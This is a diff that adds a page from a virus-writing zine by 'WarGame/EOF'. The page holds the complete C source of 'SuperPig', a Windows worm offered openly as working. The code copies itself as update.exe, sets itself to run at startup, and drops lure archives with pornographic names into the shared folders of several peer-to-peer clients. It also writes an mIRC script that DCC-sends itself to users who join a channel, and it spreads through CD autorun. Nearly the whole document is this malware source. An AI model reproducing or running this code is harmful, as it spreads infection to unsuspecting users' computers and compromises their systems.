@@ -1,0 +1,471 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: WarGame/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/WarGame/SuperPig"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+/**************************************************************************************************
+ * This is my attempt to create a full working worm ... This babe will do this:                   *
+ * Checks if an other istance of the worm is running                                              *
+ * Copies itself in windows directory with the name update.exe                                    *
+ * Sets update.exe at startup                                                                     *
+ * Infects MiRC                                                                                   *
+ * Infects ShareAza ( copies itself in download directory )                                       *
+ * Infects Gnucleus ( Finds shared folder :) )                                                    *
+ * Infects DC++     ( like gnucleus )                                                             *
+ * Infects BearShare ( The worm uses the download directory )                                     *  
+ * If the day % 2 == 0 opens the browser and goes to http://www.freetibet.org and displays a MsG  *
+ * Spreads using built-in CD burning function                                                     *
+ * After compiling this compress it with upx: upx -9 SuperPig.exe                                 *
+ * You can contact me at: wargame89@yahoo.it                                                      *
+ * Tested only under WinXP                                                                        *
+ * P.S: This shit could be buggy ... and I know my coding style is lame                           *
+ **************************************************************************************************/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+           
+           /* This is the path of the directory in which the worm will copy itself */
+static char DOWNPATH[MAX_PATH];
+
+           /* This is the function that uses built-in cd burning */
+void CDBurnsMySelf(char *my)
+{
+           HKEY hKey;
+           char folder[MAX_PATH];
+	   DWORD len = MAX_PATH,fuck;
+	   HANDLE fd = NULL;
+
+        /* Gets the special folder ... */
+
+         if(RegOpenKeyEx(HKEY_CURRENT_USER,&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders&quot;,0,KEY_QUERY_VALUE,&amp;hKey) !=
+                 ERROR_SUCCESS)
+                                {
+	                       return;
+                                }
+
+         if(RegQueryValueEx(hKey,&quot;CD Burning&quot;,0,NULL,folder,&amp;len) != ERROR_SUCCESS)
+                                {
+                              return;
+                                }
+
+         RegCloseKey(hKey);
+
+         SetCurrentDirectory(folder);
+ 
+		          /* Infinite loop */
+        while(1) {
+			 /* Copies itself and creates autorun.inf */
+                  CopyFile(my,&quot;UPDATER.exe&quot;,FALSE);
+
+                         /* Creates and writes autorun.inf */
+         fd = CreateFile(&quot;autorun.inf&quot;,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,
+                       FILE_ATTRIBUTE_NORMAL,NULL);
+
+                            if(fd != INVALID_HANDLE_VALUE)
+                            {
+                                WriteFile(fd,&quot;[autorun]\r\nopen=UPDATER.exe&quot;,27,&amp;fuck,NULL);
+                                CloseHandle(fd);
+                            }
+
+                            else
+                            {
+                                return ;
+                            }
+
+                            Sleep(1000*60*20); /* Waits 20 minutes */
+
+                 }
+}
+                         /* This function is to create .rar files ! */
+void MakeRar(char *my,char *name)
+{
+	HANDLE Check = CreateFile(name,GENERIC_READ,FILE_SHARE_READ,NULL,
+	OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+	 if(Check == INVALID_HANDLE_VALUE) 
+	 {
+	AddToRar(name,my,my,FILE_ATTRIBUTE_NORMAL);
+	 }
+	 else
+	 {
+	 CloseHandle(Check);
+	 }
+}
+                   /* Copying ... */
+void CopyMySelf(char *my)
+{
+       char name[256];
+	   int cnt1,cnt2,cnt3;
+	   char *names1[] = {&quot;pornostars_fucking_lesbian_super_&quot;,&quot;asian_fucking_veryhard_&quot;,
+		   &quot;lesbian_gangbang_&quot;,&quot;lolita_teen_fucking_&quot;,&quot;brasilian_girls_fucking_&quot;};
+	   char *names2[] = {&quot;mayagold_nikkianderson_&quot;,&quot;terapatrick_evahenger_&quot;,&quot;superpornostars_&quot;};
+	   char *names3[] = {&quot;high_quality_photo&quot;,&quot;hard_image&quot;};
+	   char *file_names[] = {&quot;FREE_PORNO_ACCESS.exe&quot;,&quot;XXX_PASSWORD_CRACKER.exe&quot;,&quot;GRATIS_SEX.exe&quot;};
+	   char *used_file = file_names[GetTickCount()%3];
+
+                            /* Changes cwd */
+                  SetCurrentDirectory(DOWNPATH);
+
+                            /* This is the file inside the .cab files */
+                  CopyFile(my,used_file,FALSE);
+
+           /* This will generate 30 files ... */
+		for(cnt1 = 0;cnt1 &lt; 5;cnt1++) 
+		{
+
+                   for(cnt2 = 0;cnt2 &lt; 3;cnt2++)
+				   {
+
+                           for(cnt3 = 0;cnt3 &lt; 2;cnt3++) 
+						   {
+
+                                          /* Creates the name for the .cab */
+                                   sprintf(name,&quot;%s%s%s.jpg.rar&quot;,names1[cnt1],names2[cnt2],names3[cnt3]);
+                                   MakeRar(used_file,name);
+
+                           }
+
+                   }
+
+           }
+                                  /* Deletes the .exe file */
+		           DeleteFile(used_file);
+}
+
+                  /* This is to infect BearShare */
+void BearShareInfection(char *my)
+{
+         HKEY hKey;
+	 DWORD len = MAX_PATH;
+	 char freepeers[MAX_PATH],bearpath[MAX_PATH];
+         DWORD pr;
+
+                                    /* Obtains BearShare path from registry */
+         if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,&quot;Software\\BearShare&quot;,0,
+                     KEY_QUERY_VALUE,&amp;hKey) != ERROR_SUCCESS)
+		 {
+			 return;
+		 }
+
+                                if(RegQueryValueEx(hKey,&quot;InstallDir&quot;,0,
+                                          NULL,bearpath,&amp;len) != ERROR_SUCCESS)
+                                {
+								    RegCloseKey(hKey); 
+									return;
+								}
+								
+
+								/* closes registry stuff */
+                                
+
+                                /* Gets the path of download directory */
+				                strcpy(freepeers,bearpath);
+
+                                /* Ok this is FreePeers.ini */
+                                strcat(freepeers,&quot;\\FreePeers.ini&quot;);
+
+                                /* Reads in ini file */
+								memset(DOWNPATH,0,MAX_PATH);
+						        GetPrivateProfileString(&quot;Downloads&quot;,&quot;szDownloadsDir&quot;,NULL,DOWNPATH,
+							       MAX_PATH,freepeers);
+
+								/* Cleats path */
+								for(pr = strlen(DOWNPATH);pr &gt; 0;pr--) 
+								{
+									if(DOWNPATH[pr] == '\\') 
+									{
+										DOWNPATH[pr] = 0;
+										break;
+									}
+								}
+
+								strcpy(DOWNPATH,DOWNPATH+1);
+
+								/* COPY ! */
+								CopyMySelf(my);
+}
+                /* Gnucleus infection */
+void GnucleusInfection(char *my)
+{
+	HKEY hKey;
+	char gnucleuspath[MAX_PATH];
+	DWORD len = MAX_PATH,cr;
+
+                /* Gets gnucleus path from registy */
+    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Gnucleus&quot;,
+                 0,KEY_QUERY_VALUE,&amp;hKey) != ERROR_SUCCESS)
+                        {
+                             return;
+                        }
+
+    if(RegQueryValueEx(hKey,&quot;UninstallString&quot;,0,NULL,gnucleuspath,&amp;len)
+                 != ERROR_SUCCESS)
+                        {
+                        return;
+                        }
+
+                 RegCloseKey(hKey);
+
+                 gnucleuspath[strlen(gnucleuspath)-1] = 0;
+				 strcpy(gnucleuspath,gnucleuspath+1);
+
+                                   for(cr = strlen(gnucleuspath);cr &gt; 0;cr--)
+                                   {
+
+                                         if(gnucleuspath[cr] == '\\')
+                                         {
+				                       		 gnucleuspath[cr] = 0;
+					                         break;
+										 }
+
+                                    }
+
+                           memset(DOWNPATH,0,MAX_PATH);
+				           strcat(gnucleuspath,&quot;\\GnuConfig.ini&quot;);
+
+                           /* Reads in ini file */
+						   GetPrivateProfileString(&quot;Share&quot;,&quot;Dir0&quot;,NULL,DOWNPATH,
+							   MAX_PATH,gnucleuspath);
+
+						   /* Clears path */
+						   for(cr = 0;cr &lt; strlen(DOWNPATH);cr++) 
+						   {
+							   if(DOWNPATH[cr] == '\n' || DOWNPATH[cr] == '\r' ||
+								   DOWNPATH[cr] == ',') 
+							   {
+								   DOWNPATH[cr] = 0;
+							   }
+						   }
+
+						   CopyMySelf(my);
+}
+                    /* Infects DC++ */
+void DCPlusPlusInfection(char *my)
+{
+	char dcpluspluspath[MAX_PATH],line[256],*part = NULL;
+	HKEY hKey;
+	FILE *fd = NULL;
+	DWORD len = MAX_PATH,cr;
+
+         /* As usual gets path from registry */
+       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,&quot;Software\\DC++&quot;,
+                0,KEY_QUERY_VALUE,&amp;hKey) != ERROR_SUCCESS)
+                        {
+                            return;
+                        }
+
+       if(RegQueryValueEx(hKey,&quot;Install_Dir&quot;,0,NULL,
+                dcpluspluspath,&amp;len) != ERROR_SUCCESS)
+                        {
+                       return;
+                        }
+
+                   RegCloseKey(hKey);
+
+                   strcat(dcpluspluspath,&quot;\\HashIndex.xml&quot;);
+	               memset(DOWNPATH,0,MAX_PATH);
+
+                        /* Open HashIndex.xml */
+           if((fd = fopen(dcpluspluspath,&quot;rb&quot;)) == NULL)
+           {
+            return;
+           }
+
+                        /* OK Finds a shared folder */
+	                while(!feof(fd))
+                    {
+				           	 memset(line,0,256);
+					         fgets(line,256,fd);
+
+                        /* If you want to understand this look at HashIndex.xml file */
+				/* Very lame string operations ! */
+					 if(strstr(line,&quot;&lt;File Name=&quot;))
+                     {
+
+                                        	    /* I do not use strtok() here because in my tests it crashed */
+						 for(cr = 0;cr &lt; strlen(line);cr++)
+                         {
+
+                                                	 if(line[cr]== '&quot;')
+                                                     {
+							                                strcpy(line,line+cr+1);
+							                                break;
+													 }
+
+                         }
+						 for(cr = strlen(line);cr &gt; 0;cr--)
+                                                 {
+
+                                                     if(line[cr]== '\\')
+                                                     {
+                                                     line[cr] = 0;
+
+                                                            /* Yahoo shared folder got ! */
+				                                     strcpy(DOWNPATH,line);
+					                                 CopyMySelf(my);
+                                                     fclose(fd);
+                                                     return;
+                                                     }
+
+                                                 }
+
+                                         }
+
+                }
+
+                fclose(fd); /* Closes file */
+}
+          /* Infects ShareAza */
+void ShareazaInfection(char *my)
+{
+	HKEY hKey;
+	DWORD len = MAX_PATH;
+ 
+	   /* This time is simple I read download directory in registry ... */
+       memset(DOWNPATH,0,MAX_PATH);
+if(RegOpenKeyEx(HKEY_CURRENT_USER,&quot;Software\\Shareaza\\Shareaza\\Downloads&quot;,
+               0,KEY_QUERY_VALUE,&amp;hKey) != ERROR_SUCCESS)
+                     {
+                     return;
+                     }
+
+if(RegQueryValueEx(hKey,&quot;CompletePath&quot;,0,NULL,DOWNPATH,&amp;len)
+               != ERROR_SUCCESS)
+                     {
+                    return;
+                     }
+                           RegCloseKey(hKey);
+                           /* COPY! */
+                           CopyMySelf(my);
+}
+    /* This is the mirc infection routine */
+void MiRcInfection(char *my) 
+{
+        HKEY hKey;
+        unsigned char mircpth[1024],mirc[MAX_PATH];
+        int i=0;
+        HANDLE fd = NULL;
+        DWORD mircpthlen=sizeof(mircpth),fuck;
+           
+                     /* Gets the path of mirc from registry */
+           if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIRC&quot;,
+                     0,KEY_QUERY_VALUE,&amp;hKey) != ERROR_SUCCESS)
+                             {
+                             return;
+                             }
+           
+           if(RegQueryValueEx(hKey,&quot;UninstallString&quot;,0,NULL,mircpth,&amp;mircpthlen)
+                     != ERROR_SUCCESS)
+                             {
+                             return;
+                             }
+               
+                                 RegCloseKey(hKey);
+                                 i=1;
+
+                     /* Plays with the read path */
+            while (mircpth[i] != 0 &amp;&amp; mircpth[i] != '.')
+            {
+	           mirc[i-1]=mircpth[i];
+	           i++;
+			}
+                    
+                      mirc[i-1]=0;
+                      i=strlen(mirc);
+
+            while (mirc[i] != 92)
+            {
+	           mirc[i]=0;
+	           i--;
+			}
+
+                      mirc[strlen(mirc)-1] = '\0';
+
+                            /* Mirc path found ! */
+                     SetCurrentDirectory(mirc);
+
+                            /* Creates the irc dropper */
+                     CopyFile(my,&quot;SEX.exe&quot;,FALSE);
+                     MakeRar(&quot;SEX.exe&quot;,&quot;SUPERPORNO.rar&quot;);
+                     DeleteFile(&quot;SEX.exe&quot;);
+
+                     fd = CreateFile(&quot;script.ini&quot;,GENERIC_WRITE,FILE_SHARE_WRITE,NULL
+                            ,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+
+            if(fd != INVALID_HANDLE_VALUE)
+            {
+                   WriteFile(fd,&quot;[Script]\r\nn0=on 1:join:#: { if ( $nick == $me ) halt\r\nn1=else /dcc send $nick SUPERPORNO.rar }&quot;,
+                            94,&amp;fuck,NULL);
+  	               CloseHandle(fd);
+            }
+                       /* DONE! */
+}
+int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+ {
+	char MyPath[MAX_PATH],cp[MAX_PATH];
+	SYSTEMTIME tm;
+                 
+	/* Checks if an other istance of the worm is running */
+	CreateMutex(NULL,FALSE,&quot;SuperPig&quot;);
+
+                  if(GetLastError() == ERROR_ALREADY_EXISTS)
+                  {
+                        ExitProcess(0);
+                  }
+
+                          /* Gets worm path */
+	          if(GetModuleFileName(NULL,MyPath,MAX_PATH) == 0)
+                  {
+                  ExitProcess(0);
+                  }
+
+                 /* Gets windows directory */
+	GetWindowsDirectory(cp,MAX_PATH);
+
+                 /* Copies itself and sets at startup */
+	strcat(cp,&quot;\\update.exe&quot;);
+	CopyFile(MyPath,cp,FALSE);
+	WriteProfileString(&quot;windows&quot;,&quot;run&quot;,cp);
+
+     /* Installs its own exceptions' handler */
+	__asm
+        {
+       Installs_handler:
+              push offset Exception
+              push dword ptr fs:[0]
+              mov  dword ptr fs:[0],esp
+              jmp Dummy
+       Exception:
+              push 0
+              call ExitProcess /* Simply exits */
+       Dummy:
+         }
+                 /* Infects mirc */
+        MiRcInfection(MyPath);
+
+                 /* Infects Shareaza */
+        ShareazaInfection(MyPath);
+
+                 /* Infects gnucleus */
+        GnucleusInfection(MyPath);
+
+                 /* Infects DC++ */
+        DCPlusPlusInfection(MyPath);
+
+                 /* Infects BearShare */
+        BearShareInfection(MyPath);
+
+                 /* Gets System's time */
+        GetSystemTime(&amp;tm);
+
+                         if(tm.wDay % 2 == 0)
+                         {
+                         ShellExecute(NULL,&quot;open&quot;,&quot;http://www.freetibet.org&quot;,
+                                    NULL,NULL,SW_SHOW);
+                         MessageBox(NULL,&quot;This r00x !!! ... This is SuperPig by [WarGame,#eof]&quot;,&quot;Credits&quot;,
+                                    MB_OK|MB_ICONINFORMATION);
+                         }
+                
+				/* CD Burning */
+        CDBurnsMySelf(MyPath); 
+}
+</pre></body></html>
